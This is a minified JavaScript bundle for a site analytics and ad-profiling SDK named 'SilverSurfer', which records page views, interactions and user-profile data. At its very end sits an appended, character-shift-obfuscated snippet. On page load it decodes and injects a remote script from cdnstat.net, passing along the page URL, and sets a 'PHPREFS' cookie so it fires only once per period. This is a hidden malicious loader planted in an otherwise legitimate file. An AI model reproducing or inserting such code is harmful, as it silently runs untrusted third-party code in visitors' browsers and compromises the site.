Galactus AdTags are empty, fallback to history");i=(null!==(r=po(zr.getState()).map((({adTags:t})=>t)))&&void 0!==r?r:[]).filter(Boolean).map(I),a={},i.forEach((function(t){for(var e=0,n=Object.entries(t);e<n.length;e++){var r,o=n[e],i=o[0],s=o[1],c=i,u=null!=(r=a[c])?r:{};if(s)for(var l=0,d=Object.entries(s);l<d.length;l++){var f,p=d[l],v=p[0],g=p[1];u[v]=(null!=(f=u[v])?f:0)+g}a[c]=u}})),o=a}var i,a;return Kr(o)&&(Rt.debug("getUserProfile: History is empty, fallback to current page"),o=I(oo(zr.getState()).adTags)),o}(n),i={beaconId:A(),gender:Object.keys(null!==(t=null==o?void 0:o.sex)&&void 0!==t?t:{}),affiliation:Vo(o),interactions:bo(zr.getState()),ageBrackets:Object.keys(null!==(e=null==o?void 0:o.age)&&void 0!==e?e:{}),devices:jo(n),language:Ro(n),country:Co(n),interests:Ho(o),consoles:Ao(o,n),streaming:$o(o,n),adTags:o,activeData:r,visitedProducts:mo(zr.getState())};return Rt.debug("getUserProfile: Profile complete",i),i}))}function Qo(t){if(jt()&&Rt.debug("AdEngine event",t),(null==t?void 0:t.name)&&(null==t?void 0:t.state)){let e;"collapse"===t.state&&(e=To.COLLAPSED),"success"===t.state&&(e=To.LOADED),"blocked"===t.state&&(e=To.BLOCKED),e&&zr.dispatch(wr({name:t.name,status:e}))}}function Zo(){const t=Ie();t&&(Rt.debug("Start listening for Ad events"),t.on("[AdEngine] Ad Slot loaded",Qo),t.on("[AdEngine] UAP Load status",Qo),t.on("[AdEngine] Ad clicked",Qo),t.on("[AdEngine] BAB detection finished",Qo))}function ti(){const t=D();return!t.isUnknown&&(Rt.debug("Updating user context from window",t.toTransport()),zr.dispatch(br(t)),t)}function ei(){!function(){const t=D();t.isUnknown?(Rt.debug("Reading user context from window failed, trying fallback..."),function(){return E.apply(this,arguments)}().then((t=>{ti()||t.isUnknown||(Rt.debug("Reading user context from fallback",t.toTransport()),zr.dispatch(br(t)))})).catch((t=>{ti()||Rt.error("Reading user context from fallback failed",t)}))):(Rt.debug("Reading user context from window",t.toTransport()),zr.dispatch(br(t)));const e=j();Rt.debug("Reading page context from window",e.toTransport()),zr.dispatch(mr(e))}(),Zn(Zo)}function ni(){let t=oo(zr.getState());t.isValid||(t=j(),t.isValid&&(Rt.debug("Updated page context from window",t.toTransport()),zr.dispatch(mr(t))));let e=ro(zr.getState());if(e.isUnknown){const t=ti();t&&(e=t)}return{current:t,pages:po(zr.getState()),features:{adBlockDetected:io(zr.getState())},slots:ao(zr.getState()),user:e}}function ri(t){return J(this,void 0,void 0,(function*(){if(!function(t){return!(!t||"string"!=typeof t.name||(null==t?void 0:t.onReboot)&&"function"!=typeof t.onReboot)}(t))return Rt.debug("registerClient: Invalid client",t),Oo({label:"client-registration",action:"invalid",client:t}),null;const e=to(zr.getState());if(function(t,e){var n;return null!==(n=null==e?void 0:e.findIndex((e=>Qr(e,t))))&&void 0!==n?n:-1}(t,e)>-1)return Rt.debug("registerClient: Already registered client",t),Oo({label:"client-registration",action:"already-registered",client:t}),null;const n=function(t){return Object.assign(Object.assign({},t),{time:Date.now(),token:"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(t){const e=16*Math.random()|0;return("x"===t?e:3&e|8).toString(16)})),ssVersion:xt})}(t);return zr.dispatch(vr(n)),Rt.debug("registerClient: Client registered",n),n.token}))}const oi=xt;function ii(t,e){return{type:t,timestamp:Date.now(),payload:e,xv:oi}}var ai;!function(t){t.PageviewRequest="SilverSurfer::Pageview::Request",t.PageviewResponse="SilverSurfer::Pageview::Response",t.AddActionRequest="SilverSurfer::AddAction::Request",t.AddActionResponse="SilverSurfer::AddAction::Response",t.AddInteractionRequest="SilverSurfer::AddInteraction::Request",t.AddInteractionResponse="SilverSurfer::AddInteraction::Response",t.HistorySizeResponse="SilverSurfer::HistorySize::Response",t.HistoryPagesResponse="SilverSurfer::HistoryPages::Response",t.HistoryActionsResponse="SilverSurfer::HistoryActions::Response",t.HistoryInteractionsResponse="SilverSurfer::HistoryInteractions::Response"}(ai||(ai={}));class si{constructor(t,e,n,r){this._sending=!1,this._queue=[],this._options={},this._onMessageCallback=n,this._origin=t,this._options=r,this._initialize(e)}get status(){return this._status}_log(t,...e){var n;(null===(n=this._options)||void 0===n?void 0:n.debug)&&console.log(`CrossDomainSender::${t}`,...e)}_initialize(t){this._log("_initialize"),this._status=Er.Initializing;const e=document.createElement("iframe");e.style.display="none",e.sandbox="allow-same-origin allow-scripts",e.addEventListener("load",this._onIframeLoad.bind(this)),e.addEventListener("error",this._onIframeLoadError.bind(this)),e.src=t,document.body.appendChild(e),this._iframe=e}_onIframeLoadError(t){var e;this._log("_onIframeLoadError",t.error),this._status=Er.Off,"function"==typeof(null===(e=this._options)||void 0===e?void 0:e.onIframeError)&&this._options.onIframeError(t)}_onIframeLoad(){this._log("_onIframeLoad");const t=new MessageChannel;t.port1.onmessage=this._onMessage.bind(this),this._sendMessage(ii(_r.Request),[t.port2])}_onMessage(t){var e;"string"==typeof(e=t.data).xv&&"number"==typeof e.timestamp&&e.timestamp>0&&"string"==typeof e.type?(this._log("_onMessage",t),t.data.type===_r.Response&&(this._status=Er.Ready),"function"==typeof this._onMessageCallback&&this._onMessageCallback(t.data)):this._log("_onMessage - invalid message",t)}_sendMessage(t,e){this._log("_sendMessage",t),this._iframe.contentWindow.postMessage(t,this._origin,e)}_flushQueue(){if(this._status===Er.Ready&&!this._sending){let t;for(this._sending=!0;t=this._queue.shift(),void 0!==t;)this._sendMessage(t);this._sending=!1}}send(t){this._queue.push(t),this._flushQueue()}}function ci(){return""!==window.location.port&&"80"!==window.location.port?null:`https://${or}`}let ui;const li=It()?500:14e3;function di(){if(!ui){if((t=>t.App.config.disableCrossdomain)(zr.getState()))return Rt.debug("Cross domain connection disabled (on purpose)"),void zr.dispatch(Pr({status:Er.Off,statusErrorMessage:"disabled"}));if(!ci())return Rt.debug("Cross domain connection disabled (unsupported origin)"),void zr.dispatch(Pr({status:Er.Off,statusErrorMessage:"incorrect-origin"}));Rt.debug("Initializing cross domain connection"),ui=new si(ci(),function(){let t=window.location.search;return eo(zr.getState())&&(t+=`${t.length?"&":"?"}cb=${Date.now()}`),`${ci()}/silver-surfer.html${t}`}(),fi,{debug:eo(zr.getState()),onIframeError:t=>{zr.dispatch(Pr({status:Er.Off,statusErrorMessage:"iframe-error"})),Rt.error("Cross domain frame error")}}),setTimeout((()=>{zr.dispatch(Pr({status:Er.Off,statusErrorMessage:"timeout"})),Rt.error("Cross domain timeout")}),li)}}function fi(t){switch(t.type){case _r.Response:return zr.dispatch(Pr({status:Er.Ready})),void Rt.debug("Cross domain connected");case ai.HistorySizeResponse:{const e=t.payload;return zr.dispatch(Tr(e)),void Rt.debug("Cross domain sent storage size",e)}case ai.HistoryInteractionsResponse:{const e=t.payload;return zr.dispatch(Mr(e)),void Rt.debug("Cross domain sent history interactions",e)}case ai.HistoryPagesResponse:{const e=t.payload;return zr.dispatch(Lr(e)),void Rt.debug("Cross domain sent history pages",e)}case ai.HistoryActionsResponse:{const e=t.payload;return zr.dispatch(Br(e)),void Rt.debug("Cross domain sent history actions",e)}case ai.PageviewResponse:return void Rt.debug("Cross domain pageview ack");case ai.AddActionResponse:return void Rt.debug("Cross domain action ack");case ai.AddInteractionResponse:return void Rt.debug("Cross domain interaction ack");default:return void Rt.error("Unknown message type",t)}}function pi(t){return J(this,void 0,void 0,(function*(){Rt.debug("New interaction",t),zr.dispatch(Nr(t)),function(t){ui&&ui.status===Er.Ready?(Rt.debug("Sending cross domain interaction",t),ui.send(function(t){return ii(ai.AddInteractionRequest,t)}(t))):Rt.debug("Cross domain not ready on interaction")}(t)}))}const vi=function(t){let e=0;const n="function"==typeof(null==t?void 0:t.onResolve)?t.onResolve:()=>{},r="function"==typeof(null==t?void 0:t.onReject)?t.onReject:()=>{};return()=>new Promise(((o,i)=>{const a=setInterval((()=>{t.eventCheck()&&(clearInterval(a),o(n())),t.intervalTime*e>t.maxWaitTime&&(clearInterval(a),i(r())),e++}),t.intervalTime)}))}({eventCheck:()=>fo(zr.getState()),intervalTime:100,maxWaitTime:5e3,onReject:()=>vo(zr.getState()),onResolve:()=>vo(zr.getState())});function gi(){return J(this,void 0,void 0,(function*(){try{return yield vi()}catch(t){if(Array.isArray(t))return t;Rt.error("Error getting actions",t)}return[]}))}function hi(t){const e=(t=>Gr(to,(e=>e.find((e=>e.token===t)))))(t)(zr.getState());if(!e)throw new Error("Incorrect token");return e}function yi(t,e){return J(this,void 0,void 0,(function*(){const n=hi(t);return function(t,e,n){let r=t.filter((t=>Qr(t.client,e))).map((t=>t.action));return"string"==typeof n&&n.length>0&&(r=r.filter((t=>t.type===n))),r}(yield gi(),n,e)}))}function bi(t){return J(this,void 0,void 0,(function*(){return It()||hi(t),yield gi()}))}function mi(t,e,n,r){return J(this,void 0,void 0,(function*(){const o=function(t,e,n,r){return{client:Xr(t),action:{time:Date.now(),name:e,type:n,payload:r}}}(hi(t),e,n,r);Rt.debug("New action",o),zr.dispatch(Rr(o)),function(t){ui&&ui.status===Er.Ready?(Rt.debug("Sending cross domain action",t),ui.send(function(t){return ii(ai.AddActionRequest,t)}(t))):Rt.debug("Cross domain not ready on action")}(o)}))}var wi;!function(t){t.ADD="add",t.CLICK="click",t.CLOSE="close",t.CONFIRM="confirm",t.CREATE="create",t.DISABLE="disable",t.ENABLE="enable",t.ERROR="error",t.HOVER="hover",t.IMPRESSION="impression",t.IDENTITY="identity",t.KEYPRESS="keypress",t.NO_IMPRESSION="no-impression",t.OPEN="open",t.PLAY_VIDEO="play-video",t.QUIZ="quiz",t.REACTION="reaction",t.REMOVE="remove",t.SELECT="select",t.SHARE="share",t.SUBMIT="submit",t.SUCCESS="success",t.SWIPE="swipe",t.VIEW="view",t.REACTION_COUNT="reaction-count",t.HEALTH="health",t.HIGHLIGHT="highlight",t.MYFANDOM="myfandom",t.CALENDAR_EVENTS="calendarevents",t.COLLECTIONITEM="collectionitem"}(wi||(wi={}));var Si=n(8446),Oi=n.n(Si);function _i(t,e,n){let r;function o(){const o=e(t.getState());Oi()(o,r)||(r=o,n(r))}const i=t.subscribe(o);return o(),i}function Ei(){return J(this,void 0,void 0,(function*(){var t,e;t=xr(oo(zr.getState())),ui&&ui.status===Er.Ready?(Rt.debug("Tracking cross domain page",t),ui.send((e=t,ii(ai.PageviewRequest,e)))):Rt.debug("Cross domain not ready on pageview")}))}const Ii="fan_visited_wikis";function xi(){return J(this,void 0,void 0,(function*(){const t=oo(zr.getState()),e=xr(t);Rt.debug("Tracking local page",e),zr.dispatch(Cr(e));try{if(yield xe(),![p.MEDIAWIKI,p.DISCUSSIONS].includes(t.product))return void Rt.debug("Fallback for visited wikis DISABLED - not MW or Discussions",t.product);let e=(function(t){const e=document.cookie.match(RegExp("(?:^|;\\s*)"+function(t){return t.replace(/([.*+?\^$(){}|\[\]\/\\])/g,"\\$1")}("fan_visited_wikis")+"=([^;]*)"));return e?e[1]:null}()||"").split(",");e.includes(t.productId)||(e=e.slice(-50),e.push(t.productId));const n=31536e3;document.cookie=`${Ii}=${e.filter(Boolean).join(",")};path=/;domain=.fandom.com;max-age=${n};SameSite=None;Secure`,Rt.debug("Fallback for visited wikis enabled, new values",e)}catch(t){Rt.debug("Consent not given, fallback cookie not set",t)}}))}function Ai(t,e){const n=new CustomEvent(t,{detail:e});window.dispatchEvent(n)}const ji="ss_galactus_enabled";function Di(){return document.cookie.includes(ji)}let ki=null;function Pi(){return J(this,void 0,void 0,(function*(){const t=(t=>t.App.state===sr.Delayed)(zr.getState()),e=Zr(zr.getState());if(!t&&!e)return Rt.error("trackPageview cannot be triggered until SilverSurfer is bootstrapped"),!1;const n=w.fromWindow();return function(t,e){return t instanceof w&&e instanceof w&&t.product===e.product&&t.productId===e.productId&&t.page===e.page&&t.pageId===e.pageId}(n,ki)?(Rt.info("Page context did not change, skipping pageview"),!1):(Rt.debug("Firing manual pageview"),ei(),xi().catch(Rt.error),e&&(uo(zr.getState())&&Ei().catch(Rt.error),zr.dispatch(lr.reboot())),t&&zr.dispatch(lr.starting()),ki=n,!0)}))}const Ci={trackPageview:Pi,getContext:ni,registerClient:ri,getUserProfile:Xo,addInteraction:pi,ACTION:wi,addActiveDataAction:Li,addAction:mi,getAllActions:bi,getActions:yi,getGalactusUserProfile:xo,isCrossdomainFinished:Vi,isCrossdomainDisabled:$i,isInitialized:Hi,isReady:Wi,getVersionHash:Gi},Ri=wi;function Ni(){return Pi()}function Ti(t){return ri(t)}function Li(t,e,n,r){return function(t,e,n,r){return J(this,void 0,void 0,(function*(){const o={time:Date.now(),name:e,type:n,payload:Object.assign(Object.assign({},r||{}),{_type:n})};(yield function(t){return J(this,void 0,void 0,(function*(){if(Ae())return!0;try{if(200===(yield Go(`${Ko}/validate/`,Object.assign({},t))).status)return!0}catch(t){Rt.error("Failed to post active data action",t)}return!1}))}(o))?yield mi(t,e,n,r):Rt.error("Error posting active data action",o)}))}(t,e,n,r)}function Bi(t,e,n,r){return mi(t,e,n,r)}function Mi(t,e){return yi(t,e)}function Ui(t){return bi(t)}function Fi(){return Xo()}function zi(t){return pi(t)}function Vi(){return wo(zr.getState())}function $i(){return(t=>t.App.config.disableCrossdomain||t.BrowserStorage.crossdomain.status===Er.Off)(zr.getState())}function Hi(){return Zr(zr.getState())}function Wi(){return Hi()&&(Vi()||$i())}function Gi(){return xt}function Ki(t){return xo(t||A())}function qi(){return ni()}try{K(y.SS_PRE_BOOTSTRAP),zr.getState().App.state===sr.New&&(Rt.debug(`Booting SilverSurfer #${xt}`,zr.getState().App.config),function(){const t=_i(zr,So,(e=>J(this,void 0,void 0,(function*(){e&&(t(),Rt.debug("Booted, running post-boot actions"),_i(zr,po,(t=>{(function(t){return J(this,void 0,void 0,(function*(){const e=!!Yt()&&(yield function(t){return J(this,void 0,void 0,(function*(){const e=yield Ht(),n=null==e?void 0:e.transaction(Bt,"readwrite",{durability:"strict"});if(!(null==n?void 0:n.store))return!1;yield n.store.clear();let r=!0;return X()(t,Kt[Gt.IndexedDB]).forEach((t=>J(this,void 0,void 0,(function*(){const{id:e}=t,o=q(t,["id"]),i=yield n.store.put(o,e);r&&(r=i===e)})))),yield n.done,r}))}(t)),n=!!Jt()&&(yield function(t){return J(this,void 0,void 0,(function*(){try{localStorage.setItem(et,JSON.stringify(X()(t,Kt[Gt.LocalStorage])))}catch(t){return!1}return!0}))}(t)),r=e||n;return r?Rt.debug("Local pages updated from cross domain"):Rt.error("Failed to update local pages"),r}))})(t.map(xr)).then((()=>{Rt.debug("LocalStorage pages saved",t)}))})),_i(zr,vo,(t=>{(function(t){return J(this,void 0,void 0,(function*(){const e=!!Yt()&&(yield function(t){return J(this,void 0,void 0,(function*(){const e=yield Ht(),n=null==e?void 0:e.transaction(Mt,"readwrite",{durability:"strict"});if(!(null==n?void 0:n.store))return!1;yield n.store.clear();let r=!0;return X()(t,qt[Gt.IndexedDB]).forEach((t=>J(this,void 0,void 0,(function*(){const e=yield n.store.put(t);r&&(r=!!e)})))),yield n.done,r}))}(t)),n=!!Jt()&&(yield function(t){return J(this,void 0,void 0,(function*(){try{localStorage.setItem(nt,JSON.stringify(X()(t,qt[Gt.LocalStorage])))}catch(t){return!1}return!0}))}(t)),r=e||n;return r?Rt.debug("Local actions updated from cross domain"):Rt.error("Failed to update local actions"),r}))})(t).then((()=>{Rt.debug("LocalStorage actions saved",t)}))})),_i(zr,yo,(t=>{(function(t){return J(this,void 0,void 0,(function*(){const e=!!Yt()&&(yield function(t){return J(this,void 0,void 0,(function*(){const e=yield Ht();return(yield null==e?void 0:e.put(Ut,t,Ft))===Ft}))}(t)),n=!!Jt()&&(yield function(t){return J(this,void 0,void 0,(function*(){try{localStorage.setItem(rt,JSON.stringify(t))}catch(t){return!1}return!0}))}(t)),r=e||n;return r?Rt.debug("Local interactions updated from cross domain"):Rt.error("Failed to update local interactions"),r}))})(t).then((()=>{Rt.debug("LocalStorage interactions saved",t)}))})),xi().catch(Rt.error),Xo().catch(Rt.error),(zr.getState().App.config.sendTracking||Di())&&(Di()||function(){const t=new Date;t.setMonth(t.getMonth()+12),document.cookie=ji+"=true;expires="+t+";domain=.fandom.com;path=/"}()),zr.dispatch(lr.ready()),K(y.SS_SDK_READY),Ai(No.READY),Zn(di))}))))}(),function(){const t=_i(zr,co,(e=>{e&&(K(y.SS_CROSS_DOMAIN_READY),t(),Rt.debug("Cross domain initialized:",so(zr.getState()),zr.getState().BrowserStorage.crossdomain.statusErrorMessage),no(zr.getState())||Ei().catch(Rt.error))})),e=_i(zr,wo,(t=>{t&&(e(),Rt.debug("Cross domain finished"))}))}(),function(){return J(this,void 0,void 0,(function*(){const t=yield function(){return J(this,void 0,void 0,(function*(){return Yt()?yield function(){var t;return J(this,void 0,void 0,(function*(){const e=yield Ht(),n=null!==(t=yield null==e?void 0:e.getAllKeys(Bt))&&void 0!==t?t:[],r=yield null==e?void 0:e.getAll(Bt);return n.map(((t,e)=>Object.assign({id:t},r[e])))}))}():Jt()?yield at():[]}))}(),e=yield function(){return J(this,void 0,void 0,(function*(){return Yt()?yield function(){return J(this,void 0,void 0,(function*(){const t=yield Ht();return yield null==t?void 0:t.getAll(Mt)}))}():Jt()?yield st():[]}))}(),n=yield function(){return J(this,void 0,void 0,(function*(){return Yt()?yield function(){var t;return J(this,void 0,void 0,(function*(){const e=yield Ht();return null!==(t=yield null==e?void 0:e.get(Ut,Ft))&&void 0!==t?t:{}}))}():Jt()?yield it():{}}))}(),r={interactions:n,actions:e,pages:t};Rt.debug("Read from local domain",r),zr.dispatch(Ur(r));const o=yield function(){return J(this,void 0,void 0,(function*(){let t=-1,e=-1;if(Yt())try{t=yield function(){return J(this,void 0,void 0,(function*(){return 4*[yield at(),yield st(),yield it()].map((t=>JSON.stringify(t).length)).reduce(((t,e)=>t+e),0)}))}()}catch(t){Rt.debug("Error while getting localStorage size",t)}if(Jt())try{e=yield function(){return J(this,void 0,void 0,(function*(){const t=yield Ht();let e=0,n=yield null==t?void 0:t.transaction(Bt).store.openCursor();for(;n;)e+=JSON.stringify(n.value).length,n=yield n.continue();let r=yield null==t?void 0:t.transaction(Mt).store.openCursor();for(;r;)e+=JSON.stringify(r.value).length,r=yield r.continue();return 4*e}))}()}catch(t){Rt.debug("Error while getting indexedDB size",t)}return{localStorageSize:t,indexedDBSize:e}}))}();zr.dispatch(Fr(o));const i=qr(t)+qr(e)+qr([n]);Lt("sdk-read-pages",t.length,.02,qr(t).toString()),Lt("sdk-total-objects",i,.02,e.length.toString()),Lt("sdk-storage-size",o.indexedDBSize,.02,o.localStorageSize.toString());try{if(navigator&&navigator.storage&&navigator.storage.estimate){const t=yield window.navigator.storage.estimate(),e=t.quota;Lt("sdk-navigator-estimate",t.usage,.02,e.toString()),t.usageDetails&&t.usageDetails.indexedDB&&Lt("sdk-navigator-estimate-indexeddb",t.usageDetails.indexedDB,.02)}}catch(t){}}))}().catch(Rt.error),no(zr.getState())?(Rt.info("Manual pageview is enabled"),zr.dispatch(lr.delayed()),Ai(No.DELAYED)):(ei(),xi().catch(Rt.error),zr.dispatch(lr.starting())))}catch(Pe){Rt.error("SilverSurfer bootstrap failed",Pe)}const Ji=Ci})(),r})()));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));